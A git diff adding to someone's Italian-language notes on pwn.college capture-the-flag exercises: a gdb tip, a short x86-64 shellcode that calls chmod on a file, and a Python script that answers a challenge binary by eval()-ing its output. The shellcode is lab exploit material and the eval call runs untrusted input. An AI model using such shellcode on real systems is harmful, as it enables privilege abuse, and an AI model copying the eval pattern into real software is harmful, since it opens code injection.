@@ -20,8 +20,6 @@ str="${str}"lxckkspssc
 #include <sys/types.h>
 #include <fcntl.h>
 
-
-
 void pwncollege(){}
 
 int main(){
@@ -261,3 +259,47 @@ NOTE: per settare breakpoint ad un indirizzo preciso bisogna usare `*`. es. `bre
 Per trovare l'indirizzo oppure l'offset fino all'istruzione `ret` uso `disas main` il quale disassebmla la funzione main.
 
 ![Disassemble main](assets/images/disas%20main.png)
+
+## Baby Assembly
+
+```s
+.intel_syntax noprefix
+.global _start
+.section .text
+
+# universal?
+_start:
+
+push 0x41
+push rsp
+pop rdi
+mov al,90 # chmod
+mov sil,44
+syscall 
+```
+
+## Magic number
+```py
+int(0x80000000)
+```
+
+## Python
+```py
+import subprocess
+
+p = subprocess.Popen("/challenge/embryoio_level100", stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+
+while True:
+    line = p.stdout.readline().decode()
+    print(line)
+    if "[TEST] CHALLENGE!" in line:
+        data = line.split(":")[1]
+        print(data)
+        res = eval(data)
+        print(res)
+        tosend = f"{str(res)}\n"
+        p.stdin.write(tosend.encode())
+        p.stdin.flush()
+    if line == "":
+        break
+```
